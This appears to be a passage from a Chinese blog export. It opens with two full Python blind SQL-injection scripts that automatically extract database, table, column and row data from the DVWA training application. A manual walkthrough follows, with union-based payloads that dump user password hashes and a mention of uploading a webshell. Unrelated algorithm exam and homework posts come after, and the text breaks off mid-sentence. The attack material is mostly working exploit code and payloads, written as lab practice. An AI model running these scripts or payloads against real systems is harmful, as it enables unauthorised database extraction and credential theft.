medium123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250import requestsimport stringclass Injection: def __init__(self,url): self.url = url self.s = requests.session() self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36] self.headers = &#123; 'Cookie': 'security=medium; PHPSESSID=ms11imgpftrmfcp27rmk9s006c' &#125; def process(self,yourstr,num1,num2): print("[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]".format(yourstr,str(num1),str(num2)),end='\r') def check(self,text): if "User ID exists in the database." in text: return True elif "User ID is MISSING from the database." in text: return False def tranhex(self,str1): result = '0x' for i in str1: result += hex(ord(i))[2:] return result def run(self): self.get_itsnum() self.get_database_length() self.get_database() self.get_table_num() self.table_length = [] self.table_name = [] self.get_table_length() self.get_table_name() table_name = input('[-] table_name: ') self.get_column_num(table_name) self.column_length = [] self.column_name = [] self.get_column_length(table_name) self.get_column_name(table_name) column_names = input('[-] column_name: ').split(',') self.word_num = 0 self.get_word_num(table_name,column_names[0]) self.word_name = [] self.word_length = [] for i in range(len(column_names)): print(column_names[i]) self.get_word_length(table_name,column_names[i]) self.get_word_name(table_name,column_names[i],i) def get_itsnum(self): self.itsnum = 0 for i in range(1,50): self.process('get_itsnum',i,50) data = &#123; 'id':"1 order by &#123;0&#125;".format(str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if not self.check(html): self.itsnum = i - 1 break if self.itsnum &gt; 0: print('\n==&gt;',self.itsnum) else: print("\ncan not get the itsnum") def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process('get_database_length',i,30) data = &#123; 'id':"1 and length(database())=&#123;0&#125;".format(str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print('\n==&gt;',self.database_length) else: print("\ncan not get the database_length") def get_database(self): self.database = '' for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + ' get_database',j,self.database_length+1) data = &#123; 'id':"1 and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;".format(str(i),str(j)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += '666' if len(self.database) &gt; 0: print('\n==&gt;',self.database) else: print("\n can not get the database") def get_table_num(self): self.table_num = 0 for i in range(1,30): self.process('get_table_num',i,30) data = &#123; 'id':"1 and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)".format(str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.table_num = i break if self.table_num &gt; 0: print('\n==&gt;',self.table_num) else: print("\ncan not get the table_num") def get_table_length(self): for i in range(1,50): self.process('get_table_length',i,50) data = &#123; 'id':"1 and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)".format(str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print('\n==&gt;',self.table_length) else: print('\ncan not get the table_length') def get_table_name(self): name = '' for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_table_name'.format(i),j,50) data = &#123; 'id':"1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)".format(str(i),str(j)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) &gt; 0: print('\n==&gt;',name) self.table_name.append(name) else: print('\ncan not get the table_name') def get_column_num(self,table_name): self.column_num = 0 table_name = self.tranhex(table_name) print(table_name) for i in range(1,30): self.process('get_column_num',i,30) data = &#123; 'id':"1 and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name=&#123;0&#125; having a=&#123;1&#125;)".format(table_name,str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print('\n==&gt;',self.column_num) def get_column_length(self,table_name): table_name = self.tranhex(table_name) for i in range(1,100): self.process('get_column_length',i,100) data = &#123; 'id':"1 and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name=&#123;0&#125; having a=&#123;1&#125;)".format(table_name,str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print('\n==&gt;',self.column_length) else: print('\ncan not get the column_length') def get_column_name(self,table_name): table_name = self.tranhex(table_name) name = '' for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_column_name'.format(str(i)),j,100) data = &#123; 'id':"1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#123;1&#125; having a=&#123;2&#125;)".format(str(i),table_name,str(j)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) == self.column_length[0]: self.column_name.append(name) print('\n==&gt;',self.column_name[0]) else: print('\ncan not get the column_name') def get_word_num(self,table_name,column_name): for i in range(1,100): self.process('get_word_num',i,30) data = &#123; 'id':"1 and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)".format(column_name,table_name,str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print('\n==&gt;',self.word_num) else: print('\ncan not get the word_num') def get_word_length(self,table_name,column_name): for i in range(1,200): self.process('get_&#123;0&#125;_length'.format(column_name),i,200) data = &#123; 'id':"1 and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)".format(column_name,table_name,str(i)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print('\n==&gt;',self.word_length) else: print('\ncan not get the word length') def get_word_name(self,table_name,column_name,word_num): name = '' for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process('get_&#123;0&#125;_name'.format(str(i)),j,100) data = &#123; 'id':"1 and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)".format(column_name,str(i),table_name,str(j)), 'Submit':'Submit', &#125; html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' self.word_name.append(name) print('\n==&gt;',self.word_name[word_num]) high123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207import requestsimport stringclass Injection: def __init__(self,url): self.url = url self.s = requests.session() self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36] def get_headers(self,payload): headers = &#123; 'Cookie': "id=&#123;0&#125;; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload) &#125; return headers def process(self,yourstr,num1,num2): print("[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]".format(yourstr,str(num1),str(num2)),end='\r') def check(self,text): if "User ID exists in the database." in text: return True elif "User ID is MISSING from the database." in text: return False def run(self): self.get_itsnum() self.get_database_length() self.get_database() self.get_table_num() self.table_length = [] self.table_name = [] self.get_table_length() self.get_table_name() table_name = input('[-] table_name: ') self.get_column_num(table_name) self.column_length = [] self.column_name = [] self.get_column_length(table_name) self.get_column_name(table_name) column_names = input('[-] column_name: ').split(',') self.word_num = 0 self.get_word_num(table_name,column_names[0]) self.word_name = [] self.word_length = [] for i in range(len(column_names)): print(column_names[i]) self.get_word_length(table_name,column_names[i]) self.get_word_name(table_name,column_names[i],i) def get_itsnum(self): self.itsnum = 0 for i in range(1,50): self.process('get_itsnum',i,50) payload = "1' order by &#123;0&#125;#".format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if not self.check(html): self.itsnum = i - 1 break if self.itsnum &gt; 0: print('\n==&gt;',self.itsnum) else: print("\ncan not get the itsnum") def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process('get_database_length',i,30) payload = "1' and length(database())=&#123;0&#125;#".format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print('\n==&gt;',self.database_length) else: print("\ncan not get the database_length") def get_database(self): self.database = '' for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + ' get_database',j,self.database_length+1) payload = "1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;#".format(str(i),str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += '666' if len(self.database) &gt; 0: print('\n==&gt;',self.database) else: print("\n can not get the database") def get_table_num(self): self.table_num = 0 for i in range(1,30): self.process('get_table_num',i,30) payload = "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#".format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.table_num = i break if self.table_num &gt; 0: print('\n==&gt;',self.table_num) else: print("\ncan not get the table_num") def get_table_length(self): for i in range(1,50): self.process('get_table_length',i,50) payload = "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#".format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print('\n==&gt;',self.table_length) else: print('\ncan not get the table_length') def get_table_name(self): name = '' for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_table_name'.format(i),j,50) payload = "1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)#".format(str(i),str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) &gt; 0: print('\n==&gt;',name) self.table_name.append(name) else: print('\ncan not get the table_name') def get_column_num(self,table_name): self.column_num = 0 for i in range(1,30): self.process('get_column_num',i,30) payload = "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#".format(table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print('\n==&gt;',self.column_num) def get_column_length(self,table_name): for i in range(1,100): self.process('get_column_length',i,100) payload = "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#".format(table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print('\n==&gt;',self.column_length) else: print('\ncan not get the column_length') def get_column_name(self,table_name): name = '' for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_column_name'.format(str(i)),j,100) payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)#".format(str(i),table_name,str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) == self.column_length[0]: self.column_name.append(name) print('\n==&gt;',self.column_name[0]) else: print('\ncan not get the column_name') def get_word_num(self,table_name,column_name): for i in range(1,100): self.process('get_word_num',i,30) payload = "1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)#".format(column_name,table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print('\n==&gt;',self.word_num) else: print('\ncan not get the word_num') def get_word_length(self,table_name,column_name): for i in range(1,200): self.process('get_&#123;0&#125;_length'.format(column_name),i,200) payload = "1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)#".format(column_name,table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print('\n==&gt;',self.word_length) else: print('\ncan not get the word length') def get_word_name(self,table_name,column_name,word_num): name = '' for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process('get_&#123;0&#125;_name'.format(str(i)),j,100) payload = "1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)#".format(column_name,str(i),table_name,str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' self.word_name.append(name) print('\n==&gt;',self.word_name[word_num])]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-SQL_Injection(SQL注入)]]></title>
    <url>%2F2019%2F10%2F28%2FDVWA-SQL-Injection%2F</url>
    <content type="text"><![CDATA[DVWA里的SQL注入。 1234567SQL 注入分类按SQLMap中的分类来看，SQL注入类型有以下 5 种： UNION query SQL injection（可联合查询注入） Stacked queries SQL injection（可多语句查询注入） Boolean-based blind SQL injection（布尔型注入） Error-based SQL injection（报错型注入） Time-based blind SQL injection（基于时间延迟注入） 123456SQL 注入常规利用思路：1、寻找注入点，可以通过 web 扫描工具实现 2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）4、可以通过获得的用户信息，寻找后台登录。 5、利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。 12345678手工注入常规思路：1.判断是否存在注入，注入是字符型还是数字型 2.猜解 SQL 查询语句中的字段数3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.查询到账户的数据 级别：low查看源码123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; mysqli_close($GLOBALS["___mysqli_ston"]);&#125;?&gt; 分析：由代码可知，通过REQUEST方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。 常见注入测试的POC： … where user_id = $id —-&gt; … where user_id = 1 or 1024=1024 … where user_id = ‘$id’ —-&gt; …where user_id = ‘1’ or ‘1024’=’1024’ … where user_id = “$id” —-&gt; … where user_id = “1” or “1024”=”1024” 判断是否存在注入，注入是字符型还是数字型输入1，查询成功： 输入1&#39;and &#39;1&#39; =&#39;2，查询失败，返回结果为空： 输入1&#39; or &#39;1&#39;=&#39;1 页面正常，并返回更多信息，成功查询 判断存在的是字符型注入。 猜解SQL查询语句中的字段数输入1&#39; or 1=1 order by 1 #，查询成功： #是注释作用 输入1&#39; or 1=1 order by 2 #，查询成功： #是注释作用 输入1&#39; or 1=1 order by 3 #，查询失败： #是注释作用 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 确认显示的字段顺序 输入1&#39; union select 1,2 #，查询成功： #是注释作用 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… 获取当前数据库 输入1&#39; union select 1,database() #，查询成功：#是注释作用 说明当前的数据库为dvwa。 获取数据库中的表输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： #是注释作用 说明数据库dvwa中一共有两个表，guestbook与users。 获取表中的字段名输入1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #，查询成功： #是注释作用 圈起来是是字段名 下载数据输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 级别：medium分析 Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 判断是否存在注入，注入是字符型还是数字型 抓包更改参数id为1&#39; or 1=1 # 报错： #是注释作用 抓包更改参数id为1 or 1=1 #，查询成功： 说明存在数字型注入。 由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。 猜解SQL查询语句中的字段数抓包更改参数id为1 order by 2 #，查询成功： 抓包更改参数id为1 order by 3 #，报错： 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 确定显示的字段顺序 抓包更改参数id为1 union select 1,2 #，查询成功： 说明执行的SQL语句为select First name,Surname from 表 where ID=id… 获取当前数据库 抓包更改参数id为1 union select 1,database() #，查询成功： 说明当前的数据库为dvwa。 获取数据库中的表抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： 说明数据库dvwa中一共有两个表，guestbook与users。 获取表中的字段名抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败： 这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过 ‘’ 抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功： 说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。 下载数据抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： 级别：highSQL Injection Source123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125;?&gt; 分析： 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 漏洞利用: 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： 特别注意：High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 参考链接： https://www.jianshu.com/p/e51cd8f15a84]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验考试]]></title>
    <url>%2F2019%2F10%2F28%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E8%80%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[算法实验上机考试 问题 A: 进制转换题目描述给定一个十进制正整数N，请将其转换为十六进制并输出。 输入一个十进制正整数N。( 1 &lt;= N &lt;= 2×109 ) 输出输出N对应的十六进制，用数字 09 以及大写字母 AF 来表示。 样例输入12019 样例输出17E3 提示递归 代码123456789101112131415161718#include&lt;bits/stdc++.h&gt;using namespace std;char *t="0123456789ABCDEF";void f(int n)&#123; if(n&gt;0) &#123; f(n/16); cout&lt;&lt;t[n%16]; &#125;&#125;int main()&#123; int m; cin&gt;&gt;m; f(m); cout&lt;&lt;endl;&#125; 问题 B: 背包问题题目描述在N件物品取出若干件放在容量为W的背包里，每件物品的体积为W1，W2……Wn（Wi为整数），与之相对应的价值为P1,P2……Pn（Pi为整数）。求背包能够容纳的最大价值。 输入第1行，2个整数，N和W中间用空格隔开。N为物品的数量，W为背包的容量。(1 &lt;= N &lt;= 1000，1 &lt;= W &lt;= 105)第2 ~ N+1行，每行2个整数，Wi和Pi，分别是物品的体积和物品的价值。(1 &lt;= Wi &lt;= 105，1 &lt;= Pi &lt;= 2×109) 输出输出可以容纳的最大价值。 样例输入12343 62 53 84 9 样例输出114 提示肯定是递归做，但是dp数组用二维的不知道为什么总是数组超限，考完和同学交流了一下，发现不是个例，考试的时候我还提交了一维的写法，但是时间又超限了，时间卡在1040，差40就可以过了，但是我交了30多遍也没用，代码就不贴出来了（我还是太弱了）。 问题 C: 迷宫问题题目描述给定一个N行M列的迷宫，其中’.’代表空地，可以通行；’#’代表障碍物，无法通行；’S’代表起点；’T’代表终点；’’S’和’T’这两个位置也是空地，可以通行。在迷宫中可以向上、下、左、右四个不同的方向行走，请你判断从起点出发是否可以走到终点？如果可以，请你计算到达终点最少需要走几步。 输入第1行，2个整数，N和M，中间用空格隔开。N为迷宫的行，M为迷宫的列。(2 &lt;= N,M &lt;= 1000)第2 ~ N+1行，每行M个字符，对应整个迷宫的布局，输入数据中保证只有’.’,’#’,’S’,’T’这四种字符，并且只有一个’S’，只有一个’T’。 输出如果可以到达终点，输出两行，第一行输出”YES”，第二行输出一个整数代表最少需要走几步。如果无法到达终点，输出”NO”。 样例输入123454 9#S#.#.#T##....##.##.##....##....#### 样例输出12YES10 提示回溯，但是考试前觉得不会考，也没怎么看，拿到手有思路，就是没写出来（话说好像和数据结构实验的最后一题差不多） 问题 D: 素数问题题目描述葬爱家族的Halobin近在研究素数，他想知道对于两个整数x和y（x&gt;y），能否找到若干个素数p1,p2,…pk，使得x=y+p1+p2+…+pk。注意素数可以无限重复使用，例如x=9,y=1，那么只需要用4个2就可以了，即9=1+2+2+2+2. 请你帮他解决这个问题。 输入第一行输入数据组数T(T&lt;100) 接下来T行每行输入两个整数x和y（0&lt;y&lt;x&lt;109） 输出如果能找到若干个素数满足条件，输出“YES”，否则输出“NO” 样例输入123454100 9842 36100000000 141 40 样例输出1234YESYESYESNO 提示这题本是签到题，但是老师中途说了思路（两数之差是1就不可能，不是就可以），我感觉是实在看不下去我们做的题了，所以才来告诉我们答案，感觉智商被按在地上摩擦。 代码1234567891011121314151617#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int t,x,y; cin&gt;&gt;t; for(int i=0;i&lt;t;i++) &#123; cin&gt;&gt;x&gt;&gt;y; if((x-y)&gt;1) &#123; cout&lt;&lt;"YES"&lt;&lt;endl; &#125; else cout&lt;&lt;"NO"&lt;&lt;endl; &#125;&#125; 问题 E: 锯木棒题目描述xiaok大佬最近再雇佣工人给他掰木棒。把一根长为L的木棒锯成两段，他需要支付给工人L元钱。xiaok大佬一开始只有长为L的一根木棒，他想把它锯成n段，每段长度分别为L1,L2,…,Ln，问xiaok大佬最少要付给工人多少钱？ 输入第一行两个整数n,L(1&lt;n&lt;103,n&lt;L&lt;109) 第二行n个整数L1,L2,…,Ln（0&lt;Li&lt;L,且保证L1+L2+…+Ln=L） 输出输出一个整数，表示最小花费 样例输入123 218 5 8 样例输出134 提示先把木棒锯成13和8两段，花费21，再把13那段锯成5和8，花费13，总花费13+21=34 很明显，贪心，设个优先级队列，（参考哈夫曼树） 代码12345678910111213141516171819202122232425262728293031#include&lt;bits/stdc++.h&gt;using namespace std;struct cmp1&#123; bool operator()(int&amp; a,int&amp; b) &#123; return a&gt;b; &#125;&#125;;int main()&#123; priority_queue&lt;int,vector&lt;int&gt;,cmp1&gt; pq; int n,l,s; cin&gt;&gt;n&gt;&gt;l; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s; pq.push(s); &#125; int sum=0; while(pq.size()&gt;1) &#123; int a=pq.top(); pq.pop(); int b=pq.top(); pq.pop(); sum=sum+a+b; pq.push(a+b); &#125; cout&lt;&lt;sum&lt;&lt;endl;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验作业]]></title>
    <url>%2F2019%2F10%2F26%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A%2F</url>
    <content type="text"><![CDATA[算法作业。 问题 A: 凯撒加密法题目描述​ 凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。​ 例如，当偏移量是左移3的时候：明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。例如：​ 明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG​ 密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ​ 现在给定你一个字符串S（长度不会超过1000000）和一个整数k（-1000000000&lt;=k&lt;=1000000000），分别代表接受者收到的密文和在加密该密文时向后的偏移量，你的任务是计算出原来的明文​ 注意：只有字母在加密时才会发生偏移，其它字符保持不变 输入​ 输入包含多组数据，其中第一行为数据组数T（T&lt;=10）​ 每组数据第一行为一个字符串S，由数字、字母以及常见字符组成（不含空格），第二行为一个整数k代表加密时向后的偏移量（|S|&lt;=1000000,-1000000000&lt;=k&lt;=1000000000） 输出​ 对每组数据，输出一行字符串，代表输入中的密文对应的明文。 样例输入1231DEFGHIJKLMNOPQRSTUVWXYZABC3 样例输出1ABCDEFGHIJKLMNOPQRSTUVWXYZ 提示代码1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int t; cin&gt;&gt;t; while(t--) &#123; int k; string s; cin&gt;&gt;s; cin&gt;&gt;k; k=k%26; int len=s.length(); for(int i=0;i&lt;len;i++) &#123; if(s[i]&gt;='A'&amp;&amp;s[i]&lt;='Z') &#123; s[i]=s[i]-k; if(s[i]&lt;'A') &#123; s[i]=s[i]+26; &#125; if(s[i]&gt;'Z') &#123; s[i]=s[i]-26; &#125; &#125; if(s[i]&gt;='a'&amp;&amp;s[i]&lt;='z') &#123; s[i]=s[i]-k; if(s[i]&lt;'a') &#123; s[i]=s[i]+26; &#125; if(s[i]&gt;'z') &#123; s[i]=s[i]-26; &#125; &#125; &#125; cout&lt;&lt;s&lt;&lt;endl; &#125; &#125; 问题 B: Vigenère 密码题目描述16 世纪法国外交家 Blaise de Vigenère 设计了一种多表密码加密算法——Vigenère 密码。Vigenère 密码的加密解密算法简单易用，且破译难度比较高，曾在美国南北战争中为南军所广泛使用。 在密码学中，我们称需要加密的信息为明文，用 MM 表示；称加密后的信息为密文，用 CC 表示；而密钥是一种参数，是将明文转换为密文或将密文转换为明文的算法中输入的数据，记为 kk。 在 Vigenère 密码中，密钥 kk 是一个字母串，k=k1k2…kn。当明文 M = m1m2…mn 时，得到的密文 C = c1c2…cn ，其中 ci = mi ® ki，运算 ® 的规则如下表所示： Vigenère 加密在操作时需要注意： ® 运算忽略参与运算的字母的大小写，并保持字母在明文 MM 中的大小写形式； 当明文 MM 的长度大于密钥 kk 的长度时，将密钥 kk 重复使用。 例如，明文 M=M=Helloworld，密钥 k=k=abc时，密文 C=C=Hfnlpyosnd。 输入第一行为一个字符串，表示密钥 kk，长度不超过 100100，其中仅包含大小写字母。 第二行为一个字符串，表示经加密后的密文，长度不超过 